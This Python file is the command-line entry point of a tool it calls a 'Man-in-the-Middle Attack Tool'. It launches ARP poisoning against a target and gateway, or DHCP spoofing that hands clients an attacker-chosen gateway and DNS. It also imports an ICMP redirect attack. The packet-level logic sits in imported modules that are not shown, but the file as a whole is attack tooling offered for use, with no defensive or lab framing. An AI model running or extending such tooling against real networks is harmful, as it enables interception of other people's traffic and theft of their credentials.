import argparse
import sys
import time
from scapy.all import *
from arp_poison import ARPPoisoner
from dhcp_spoof import DHCPSpoofer
import threading
import signal
import os
import logging
from utils import setup_logging, print_status, validate_ip, validate_ip_with_error, enable_ip_forwarding
import config
from icmp_redirect import run_attack as run_icmp_redirect

logger = logging.getLogger(__name__)

def setup_argparse():
    parser = argparse.ArgumentParser(description='Man-in-the-Middle Attack Tool')
    subparsers = parser.add_subparsers(dest='attack_type', help='Type of attack to perform')
    
    # ARP Poisoning parser
    arp_parser = subparsers.add_parser('arp', help='ARP poisoning attack')
    arp_parser.add_argument('target_ip', help='Target IP address')
    arp_parser.add_argument('gateway_ip', help='Gateway IP address')
    arp_parser.add_argument('--interface', default=config.INTERFACE, help='Network interface to use')
    
    # DHCP Spoofing parser
    dhcp_parser = subparsers.add_parser('dhcp', help='DHCP spoofing attack')
    dhcp_parser.add_argument('spoofed_ip', help='IP address to assign to clients')
    dhcp_parser.add_argument('spoofed_gw', help='Gateway IP address to assign')
    dhcp_parser.add_argument('--dns', default='8.8.8.8,8.8.4.4', help='DNS servers to assign (comma-separated)')
    dhcp_parser.add_argument('--lease-time', type=int, default=43200, help='DHCP lease time in seconds')
    dhcp_parser.add_argument('--subnet-mask', default='255.255.255.0', help='Subnet mask to assign')
    dhcp_parser.add_argument('--interface', default='bridge101', help='Network interface to use')
    
    return parser

def run_arp_poison(target_ip, gateway_ip, stop_event=None, interface=None):
    """Run ARP poisoning attack with proper cleanup.
    
    Args:
        target_ip (str): IP address of the target to poison
        gateway_ip (str): IP address of the gateway
        stop_event (threading.Event, optional): Event to signal when to stop the attack
        interface (str, optional): Network interface to use for the attack
        
    Returns:
        bool: True if attack was successful, False otherwise
    """
    poisoner = None
    try:
        # Validate parameters
        if not target_ip or not gateway_ip:
            error_msg = "Target IP and Gateway IP must be provided"
            logger.error(error_msg)
            print_status(error_msg, "error")
            return False
            
        # If interface is provided, use it, otherwise use the default from config
        if interface is None:
            interface = config.INTERFACE
            
        logger.info(f"Starting ARP poisoning attack: target={target_ip}, gateway={gateway_ip}, interface={interface}")
        
        # Create ARP poisoner instance
        poisoner = ARPPoisoner(target_ip, gateway_ip, interface)
        
        # Start the attack
        if not poisoner.start():
            logger.error("Failed to start ARP poisoning attack")
            return False
        
        # Keep running until stop event is set
        while not (stop_event and stop_event.is_set()):
            time.sleep(1)
        
        # Clean up
        if poisoner:
            poisoner.stop()
        return True
    except Exception as e:
        print_status(f"[ERROR] ARP poisoning failed: {str(e)}", "error")
        logger.error(f"ARP poisoning failed: {str(e)}")
        # Make sure we clean up even in case of an exception
        if poisoner:
            try:
                poisoner.stop()
            except Exception as cleanup_error:
                logger.error(f"Error during cleanup: {str(cleanup_error)}")
        return False

def run_dhcp_spoof(spoofed_ip, spoofed_gw, dns, lease_time, subnet_mask, interface, stop_event=None):
    """Run DHCP spoofing attack with proper cleanup.
    
    Args:
        spoofed_ip (str): IP address to assign to clients
        spoofed_gw (str): Gateway IP address to assign
        dns (list or str): DNS servers to assign
        lease_time (int): DHCP lease time in seconds
        subnet_mask (str): Subnet mask to assign
        interface (str): Network interface to use
        stop_event (threading.Event, optional): Event to signal when to stop the attack
        
    Returns:
        bool: True if attack was successful, False otherwise
    """
    spoofer = None
    try:
        # Validate parameters
        if not spoofed_ip or not spoofed_gw:
            error_msg = "Spoofed IP and Gateway IP must be provided"
            logger.error(error_msg)
            print_status(error_msg, "error")
            return False
            
        # Default to config interface if none provided
        if interface is None:
            interface = config.INTERFACE
            
        logger.info(f"Starting DHCP spoofing attack: ip={spoofed_ip}, gateway={spoofed_gw}, interface={interface}")
        
        # Create DHCP spoofer instance
        spoofer = DHCPSpoofer(spoofed_ip, spoofed_gw, dns, lease_time, subnet_mask, interface)
        
        # Start the attack
        spoofer.start()
        
        # Keep running until stop event is set
        while not (stop_event and stop_event.is_set()):
            time.sleep(1)
        
        # Clean up
        if spoofer:
            spoofer.stop()
        return True
    except Exception as e:
        print_status(f"[ERROR] DHCP spoofing failed: {str(e)}", "error")
        logger.error(f"DHCP spoofing failed: {str(e)}")
        # Make sure we clean up even in case of an exception
        if spoofer:
            try:
                spoofer.stop()
            except Exception as cleanup_error:
                logger.error(f"Error during cleanup: {str(cleanup_error)}")
        return False

def main():
    # Setup logging
    setup_logging(config.LOG_FILE, config.LOG_LEVEL)

    parser = setup_argparse()
    args = parser.parse_args()
    
    if not args.attack_type:
        parser.print_help()
        sys.exit(1)
    
    try:
        if args.attack_type == 'arp':
            success = run_arp_poison(args.target_ip, args.gateway_ip, interface=args.interface)
        elif args.attack_type == 'dhcp':
            success = run_dhcp_spoof(
                args.spoofed_ip,
                args.spoofed_gw,
                args.dns,
                args.lease_time,
                args.subnet_mask,
                args.interface
            )
        
        if not success:
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n[INFO] Attack stopped by user")
        sys.exit(0)
    except Exception as e:
        print_status(f"Error: {e}", "error")
        sys.exit(1)

if __name__ == "__main__":
    main() 